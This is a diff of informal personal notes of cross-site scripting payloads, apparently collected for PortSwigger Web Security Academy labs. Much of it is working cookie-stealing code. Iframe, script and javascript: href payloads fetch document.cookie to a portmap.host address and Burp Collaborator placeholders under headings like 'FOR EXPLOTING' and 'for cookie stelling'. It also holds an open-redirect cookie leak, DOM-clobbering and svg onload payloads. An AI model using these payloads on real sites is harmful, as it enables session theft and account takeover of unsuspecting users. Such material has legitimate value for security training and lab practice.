@@ -1,7 +1,7 @@
 
 |||||||||||||||||||||||||||||||||||||||||||||||||||||
 Cheat-sheet link : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onafterscriptexecute
-|||||||||||||||||||||||||||||||||||||||||||||||||||||
+||||||||||||||||||||||||FOR EXPLOTING|||||||||||||||||||||||||||||
 <iframe src="javascript:var i=' ' + document.cookie; alert(i); fetch('http://pip3lee101-64604.portmap.host:64604/?sam')">
 
 
@@ -16,7 +16,6 @@ mode: 'no-cors',
 body:document.cookie
 }); console.log(document.cookie);" >
 
-
 <script>
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 method: 'POST',
@@ -25,7 +24,7 @@ body:document.cookie
 });
 </script>
 
-for cookie stelling HREF
+//////////// for cookie stelling HREF
 javascript:fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 method: 'POST',
 mode: 'no-cors',
@@ -33,24 +32,26 @@ body:document.cookie
 });
 
 
-|||||||||||||||||||||||||||||||||||||||||||||||||||||
+|||||||||||||||||||||FOR TESTING||||||||||||||||||||||||||||||||
 HTML HTML HTML entities test ===>
 &#x6c;&#x65;&#x65;&#x31;&#x30;&#x31;
 |||||||||||||||||||||||||||||||||||||||||||||
 
-
-for seperate html page
-<iframe src="https://0a97007b03b5c853c0631f0600af003c.web-security-academy.net/" onload="this.src+='<img src=x onerror=print()>'"></iframe>
-
-
+===> OPEN Redirect
+http://url.com/?lee101=javascript://%250Alert(document.location=document.cookie)
+///////
 for anchor HREF inputs this payload to store <a src="javascript:alert(1)">LIKE website</a> ++++===>
 javascript:alert(1)
 http://foo?&apos;-alert(1)-&apos;
 
 
-||||||||||||||||||||||||||||||||||||||||||||||||||||||
-for testing =====>
+//// for seperate html page
+<iframe src="https://0a97007b03b5c853c0631f0600af003c.web-security-academy.net/" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+
+|||||||||||||||||||||FOR TESTING||||||||||||||||||||||||||||||||
 <iframe src="javascript:alert('xss');" >
+<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
 <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
 "><svg onload=alert(document.cookie);>
 <svg onload=alert(document.cookie);>
